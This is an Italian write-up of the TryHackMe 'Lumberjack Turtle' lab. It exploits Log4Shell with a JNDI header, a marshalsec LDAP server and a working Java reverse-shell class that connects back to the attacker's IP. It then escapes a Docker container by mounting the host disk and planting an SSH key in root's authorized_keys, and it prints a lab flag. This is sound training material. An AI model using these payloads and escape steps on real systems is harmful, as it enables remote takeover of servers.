#tryhackme 

https://tryhackme.com/room/lumberjackturtle

Cosa c'entrano i boscaioli e le tartarughe con questa sfida?

Entra nel computer. Ottieni i permessi di root. Vedrai che ci riuscirai.

```
nmap -Pn -v -O 10.10.0.78
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
nmap -sVC -p22,80 10.10.0.78
```
```
PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 51:f6:b3:29:1c:5d:20:c6:66:0c:27:57:16:0e:b9:35 (RSA)
|   256 20:b6:c5:89:20:d7:94:bd:69:76:3c:e5:12:f1:28:4d (ECDSA)
|_  256 7d:bc:a7:86:68:be:28:5e:7e:1f:ff:6a:67:9d:ae:a4 (ED25519)
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
enumeriamo un pò
```
gobuster dir -u http://10.10.0.78 -w /usr/share/wordlists/dirb/common.txt -t50
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# gobuster dir -u http://10.10.0.78 -w /usr/share/wordlists/dirb/common.txt -t50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.78
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/~logs                (Status: 200) [Size: 29]
/error                (Status: 500) [Size: 73]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

```
http://10.10.0.78/~logs
```
visitando la pagina ci da un indizio di andare più a fondo
```
gobuster dir -u http://10.10.0.78/~logs -w /usr/share/wordlists/dirb/common.txt -t50
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# gobuster dir -u http://10.10.0.78/~logs -w /usr/share/wordlists/dirb/common.txt -t50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.78/~logs
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/log4j                (Status: 200) [Size: 47]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

```
http://10.10.0.78/~logs/log4j
```
ci restituisce un altro indizio
```
Hello, vulnerable world! What could we do HERE?
```
**Facciamo una ricerca e vediamo cosa è Log4j**
La vulnerabilità Log4j, conosciuta anche come [Log4Shell](https://www.ibm.com/it-it/think/topics/log4shell), è una vulnerabilità critica scoperta nella libreria di registrazione Apache Log4j nel novembre del 2021. Sostanzialmente, Log4Shell concede agli hacker il controllo totale dei dispositivi eseguendo versioni di Log4j senza patch.

Log4j è un framework di registrazione sviluppato dalla Apache Software Foundation. Come suggerisce il nome, Log4J è un programma di registrazione che registra informazioni importanti, come messaggi di errore e input degli utenti in un programma.

**Log4Shell**, identificata come **CVE-2021-44228**, è una vulnerabilità critica di esecuzione di codice remoto (RCE) presente nelle versioni **2.14.1** e precedenti di Apache Log4J. Le versioni **2.15** e successive, insieme a tutte le versioni di Apache Log4J 1, non sono affette.

**Modus Operandi della Vulnerabilità**

La vulnerabilità deriva dal modo in cui Log4J gestisce le **Java Naming and Directory Interface (JNDI)**, una API utilizzata dalle applicazioni Java per accedere a risorse esterne. Le versioni vulnerabili di Log4J eseguono automaticamente qualsiasi codice ottenuto tramite un JNDI lookup.

- **Meccanismo di Attacco**: Gli hacker possono inviare comandi JNDI attraverso messaggi di log. Ad esempio, giocatori di Minecraft Java Edition, che utilizza Log4J, possono inviare comandi di ricerca nella chat pubblica.
- **Processo di Esecuzione**: Un attaccante:
    1. Configura un server (usualmente LDAP) per ricevere richieste.
    2. Memorizza un payload dannoso su quel server.
    3. Invia un comando JNDI per far sì che l'app scarichi ed esegua il payload.

Questa vulnerabilità ha reso molte applicazioni e servizi esposti e vulnerabili ad attacchi remoti, rappresentando un serio rischio per la sicurezza.

Sarebbe opportuno risolvere prima questa stanza dedicata a Log4J https://tryhackme.com/room/solar

apriamo un listener netcat sulla porta 1234 ed eseguiamo un cURL

```
nc -lvnp 1234
```

```bash
curl -L -i 'http://10.10.0.78/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://10.14.99.134:1234/aaa}'
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.0.78] 52426
0
 `�
```
come possiamo notare è una versione vulnerabile


https://matteobasso.com/thm-lumberjack-turtle-writeup/
ho dovuto riprendere la stanza in un secondo momento quindi il nuovo ip assegnato è
```
10.10.138.71
```

```
http://10.10.138.71/~logs/log4j
```

Passiamo allo sfruttamento
per fare ciò

 **1) Avviamo un server LDAP**
```
cd /home/kali/Downloads/marshalsec
```
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.14.99.134:8000/#Exploit"
```

**2) Creiamo il codice Exploit Java** 
modificalo per utilizzare il tuo IP
```
nano Exploit.java
```
```shell-session
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

  public Exploit() throws Exception {
    String host="10.14.99.134";
    int port=9999;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}   

```

 **3) Compilare il codice exploit Java**
```
javac Exploit.java -source 8 -target 8
```

**4) Ospita il file Java exploit tramite server HTTP**
eseguirlo dalla stessa directory dove risiede il file Exploit.java
```shell-session
python3 -m http.server 8000
```

**5) Prepariamo il nostro lister Netcat o penelope**
```shell-session
nc -lnvp 9999
```
oppure
```
python3 penelope.py -p 9999
```

**6) Attiva l'exploit e attiva la nostra sintassi JNDI**

```
curl -L -i 'http://10.10.138.71/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://10.14.99.134:1389/Exploit}'
```

Modificare l'indirizzo IP dell'aggressore e del server come appropriato.  

Quindi appena il comando sarà eseguito avverrà una richiesta al sito 10.10.138.71 il quale contatterà il nostro server LDAP in ascolto sulla porta 1389 ed eseguirà il file Exploit.java ospitato sul server python porta 8000 il quale a sua volta si collegherà al nostro listener in ascolto sulla porta 9999 ed otterremo la reverse shell
**Esegui il comando sopra e cattura una reverse shell nel tuo listener netcat!**

```
bash-4.4# ls
app    dev    home   media  opt    root   sbin   sys    usr
bin    etc    lib    mnt    proc   run    srv    tmp    var
bash-4.4# whoami
root
bash-4.4# 

```

**Qual è la prima bandiera?**

```
bash-4.4# cd root
bash-4.4# ls
bash-4.4# ls -al
total 8
drwx------    2 root     root          4096 Dec 20  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
bash-4.4# cd /home
bash-4.4# ls
bash-4.4# cd /opt
bash-4.4# ls -al
total 12
drwxr-xr-x    1 root     root          4096 Dec 11  2021 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
-rw-r--r--    1 root     root            19 Dec 11  2021 .flag1
bash-4.4# cat .flag1
THM{LOG4SHELL_FTW}
bash-4.4# 

```

```
THM{LOG4SHELL_FTW}
```

**Qual è il flag root "reale"?**

```
df -h
```


Output del comando `df -h`

|File System|Size|Used|Available|Use%|Mounted on|
|---|---|---|---|---|---|
|overlay|38.7G|4.7G|34.0G|12%|/|
|tmpfs|64.0M|0|64.0M|0%|/dev|
|tmpfs|965.9M|0|965.9M|0%|/sys/fs/cgroup|
|shm|64.0M|0|64.0M|0%|/dev/shm|
|/dev/nvme0n1p1|38.7G|4.7G|34.0G|12%|/etc/resolv.conf|
|/dev/nvme0n1p1|38.7G|4.7G|34.0G|12%|/etc/hostname|
|/dev/nvme0n1p1|38.7G|4.7G|34.0G|12%|/etc/hosts|

- **Overlay**: Il filesystem `overlay` è comunemente utilizzato da Docker per gestire i layer delle immagini. Questo indica chiaramente che stai operando all'interno di un contenitore Docker.
- **tmpfs**: L'uso di `tmpfs` per `/dev` e `/sys/fs/cgroup` è tipico dei contenitori, poiché non hanno una macchina virtuale completa ma un filesystem in-memory per queste directory.

```
uname -a
```
Output del comando `uname -a`

`Linux 81fbbf1def70 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 Linux`
- **Nome del kernel**: La presenza di un kernel Linux con un ID (81fbbf1def70) riconducibile a un contenitore è un ulteriore segnale che stai operando in un ambiente Docker.

```
hostname
```
Output del comando `hostname`
`81fbbf1def70`
- **Hostname**: Il nome dell'host che corrisponde all'ID del contenitore è coerente con il comportamento di Docker, dove ogni contenitore ha un hostname unico.

**Conclusioni**
Siamo dentro ad un docker!

```
fdisk -l
```
vediamo cosa ci restituisce fdisk
```
bash-4.4# fdisk -l
Disk /dev/nvme0n1: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
Disklabel type: dos
Disk identifier: 0x3650a2cc

Device         Boot Start      End  Sectors Size Id Type
/dev/nvme0n1p1 *     2048 83886046 83883999  40G 83 Linux


Disk /dev/nvme1n1: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes


Disk /dev/nvme2n1: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
bash-4.4# 

```

Possiamo accedere all'intero disco, creiamo una directory temporanea e montiamola:

```bash
mkdir -p /mnt/boom
```

```bash
mount /dev/nvme0n1p1 /mnt/boom
```

```bash
df -h
```
```
bash-4.4# df -h
Filesystem                Size      Used Available Use% Mounted on
overlay                  38.7G      4.7G     34.0G  12% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                   965.9M         0    965.9M   0% /sys/fs/cgroup
shm                      64.0M         0     64.0M   0% /dev/shm
/dev/nvme0n1p1           38.7G      4.7G     34.0G  12% /etc/resolv.conf
/dev/nvme0n1p1           38.7G      4.7G     34.0G  12% /etc/hostname
/dev/nvme0n1p1           38.7G      4.7G     34.0G  12% /etc/hosts
/dev/nvme0n1p1           38.7G      4.7G     34.0G  12% /mnt/boom

```

```bash
cd /mnt/boom
```
```
bash-4.4# cd root
bash-4.4# ls -al
total 36
drwx------    5 root     root          4096 Jun  5 18:16 .
drwxr-xr-x   22 root     root          4096 Nov  7 08:47 ..
drwxr-xr-x    2 root     root          4096 Dec 13  2021 ...
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwx------    2 root     root          4096 May 24 14:35 .cache
-rw-r--r--    1 root     root           161 Jan  2  2024 .profile
drwx------    2 root     root          4096 Dec 13  2021 .ssh
-rw-------    1 root     root           966 Jun  5 18:16 .viminfo
-r--------    1 root     root            29 Dec 13  2021 root.txt
bash-4.4# cat root.txt
Pffft. Come on. Look harder.
```
ci dice guarda più attentamente

Abbiamo una dir .ssh
per ottenere un accesso completo come root possiamo provare a sfruttare ssh

creiamo su Kali una chiave ssh
```bash
ssh-keygen
```

```
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): 
Enter passphrase for "/home/kali/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_ed25519
Your public key has been saved in /home/kali/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:IwbBLD910RoJrIcCtUiwJpqYNDmOueoGwNxTY66CRkQ kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|+E.o.....+       |
|o+o.o=o + .      |
|BBoo=+.. o       |
|XB+o=o. .        |
|@. .ooo S        |
|o+ . . . .       |
|+ .              |
|..               |
|+.               |
+----[SHA256]-----+

```

```
chmod 600 id_ed25519
```

```bash
python3 -m http.server 80
```

dalla reverse shell del docker

```bash
cd /mnt/boom/root/.ssh
```
scarichiamo la chiave creata
```
wget 10.14.99.134/id_ed25519.pub
```

```
cat id_ed25519.pub >> authorized_keys
```

Ora ci colleghiamo da Kali tramite ssh

```bash
ssh -i id_ed25519 root@10.10.138.71
```

```
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Thu Jun  5 18:14:22 2025 from 10.23.8.228
root@ip-10-10-92-42:~# la
...  .bashrc  .cache  .profile  .ssh  .viminfo  root.txt
root@ip-10-10-92-42:~# ls
root.txt
root@ip-10-10-92-42:~# cat root.txt
Pffft. Come on. Look harder.
root@ip-10-10-92-42:~# netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      524/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      636/sshd: /usr/sbin 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1053/docker-proxy   
tcp6       0      0 :::22                   :::*                    LISTEN      636/sshd: /usr/sbin 
tcp6       0      0 :::80                   :::*                    LISTEN      1058/docker-proxy   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           524/systemd-resolve 
udp        0      0 10.10.92.42:68          0.0.0.0:*                           522/systemd-network 
root@ip-10-10-92-42:~# cd ...
root@ip-10-10-92-42:~/...# ls -ltra
total 12
drwxr-xr-x 2 root root 4096 Dec 13  2021 .
-r-------- 1 root root   26 Dec 13  2021 ._fLaG2
drwx------ 5 root root 4096 Jun  5 18:16 ..
root@ip-10-10-92-42:~/...# cat ._fLaG2
THM{xxxxxxxxxxxx}
root@ip-10-10-92-42:~/...# 

```

```
THM{xxxxxxxxxxxxxx}
```